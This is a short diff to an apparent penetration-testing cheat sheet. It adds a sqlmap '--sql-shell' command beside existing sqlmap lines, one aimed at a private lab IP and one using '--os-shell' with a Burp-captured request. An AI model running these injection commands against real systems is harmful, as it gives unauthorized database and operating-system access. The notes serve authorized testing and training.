@@ -732,6 +732,9 @@ sqlmap -u "http://192.168.225.48/" --data="mail-list=asdf@asdf.com" --method=POS
 
 # Intercepting the POST request with Burp, Running sqlmap with os-shell
 sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
+
+# Intercepting the sql shell
+sqlmap -r post.txt -p item --sql-shell
 ~~~
 
 
